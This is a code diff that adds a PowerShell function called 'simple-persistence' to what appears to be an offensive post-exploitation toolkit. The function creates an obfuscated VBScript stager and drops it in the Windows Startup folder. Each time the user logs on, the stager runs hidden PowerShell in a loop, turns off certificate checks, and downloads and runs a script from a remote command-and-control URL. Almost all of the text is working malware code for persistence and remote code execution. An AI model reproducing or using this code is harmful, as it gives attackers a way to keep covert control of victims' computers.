@@ -641,6 +641,151 @@ function shortcut-inject {
 
 }
 
+
+function simple-persistence {
+
+	[CmdletBinding()] Param(
+
+	[Parameter(Position=0)]
+	[String]
+	$scriptUrl
+
+	)
+	
+	if ($scriptUrl) 
+	{ 
+	
+		if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) 
+		{ 
+	
+			#[->] internal function for variable name randomization
+			function rand-str { 
+	
+				$rint = get-random -max 10 -min 3
+				$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
+				1..$rint | % { $rchr += $charArray | get-random }
+				$randstr = [string]::join("", ($rchr))
+		
+				return $randstr	
+			}
+
+			#[->] made function internal for portability
+			function gen-enccmd { 
+
+				param($clrcmd)
+				$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString()) 
+				$enccmd = [Convert]::ToBase64String($bytescmd) 
+
+				return $enccmd
+
+			}
+
+	
+			#[->] prep command download string to be passed to obfuscation engine
+
+			$cmds = 'while(1){try{powershell -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''') }" }catch{ Start-Sleep -s 60 } Start-Sleep -s 30}'
+			$encCmdString = gen-enccmd $cmds
+			$cmdstring = 'cmd /q /c powershell.exe -w hidden -enc ' + $encCmdString
+	
+			#[->] create vbs script then change attribute to hidden
+			$saveDir = $env:appdata + '\Microsoft\Windows\start menu\programs\Startup\'
+	
+			#[->] set variables for template generation
+			$newline = "`r`n"
+			$vbsfile = $newline
+
+			#[->] initialize first function in vbs script 
+			$randfunc = rand-str
+			$vbsfile += 'Function ' + $randfunc + '() ' + $newline
+
+			#[->] Obfuscate first wscript command string
+			$cmdstrArray = @()
+			[int]$ccnt = '1'
+			foreach ( $char in $cmdstring.GetEnumerator() ) {
+
+				#[->] translate to ascii value then do math ops on it
+				$val = [Byte][Char]$char
+				$rnum = get-random -max 9 -min 1
+				$nval = [int]$val - [int]$rnum
+				$hval = [int]$nval / '2'
+
+				if ( [int]$ccnt -eq '1' ) 
+				{
+
+					#[->] genrate random variable name then append it to array
+					$rvarstr = rand-str
+					$rvarstr += rand-str
+					$cmdstrArray += $rvarstr
+					$vbsfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
+
+			
+				} else {
+
+					$vbsfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
+	
+				}
+		
+				#[->] create random legnth of char use 
+				$randval = get-random -max 12 -min 1 
+				if ( $randval -eq '8' ) { $vbsfile += $newline; [int]$ccnt = 0 }
+				$ccnt++
+
+			}
+
+			#[->] concatinate vars to single command string
+			[int]$cnt = 1
+			foreach ( $randvar in $cmdstrArray )  {
+		
+				if ( $cnt -eq '1' ) 
+				{ 
+					$mainRvar = rand-str
+					$vbsfile += $newline
+					$vbsfile += $mainRvar + ' = ' + $randvar 
+		
+				} else {
+		
+					$vbsfile += ' + ' + $randvar 
+		
+				}
+		
+				$cnt++
+		
+			}
+	
+			$fso1 = rand-str
+			$vbsfile += $newline
+			$vbsfile += 'set ' + $fso1 + ' = ' + 'createObject("wscript.shell")' + $newline
+			$vbsfile += $fso1 + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
+			$vbsfile += 'End Function' + $newline
+			# $vbsfile += 'WScript.Sleep 180000' + $newline
+			$vbsfile += $randfunc
+	
+			#[->] vbs script in "vbsfile" is ready to be written to disk
+	
+			$rand = rand-str; $vbsName = $rand + '.vbs'
+			$vbspath = $saveDir + $vbsName
+	
+			set-content $vbspath $vbsfile -Encoding ASCII
+
+			#[->] VBS CODE GENERATION END
+	
+			write-output "[+] finished generating obfuscated stager."
+
+		} else { write-output "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script" }
+		
+	} else { 
+		
+		$usage =  "`n" + '[=>] Ex: RSH => C:\> simple-persistence "https://your-domain.com/ps-script"' + "`n"
+		$usage += '[=>] drops an obfuscated vbs script to the windows startup folder.' + "`n"
+		$usage += '[=>] Insure that the script is self contained and does not need additional parameters' + "`n"
+		$usage += '[=>] for the C2 ip/port etc...' + "`n"
+		
+		write-output $usage
+		
+	}
+
+}
+
 # action = hide or clear
 # key = encrpytion or decryption string
 # string = base64 string to either be encrypted or decrypted
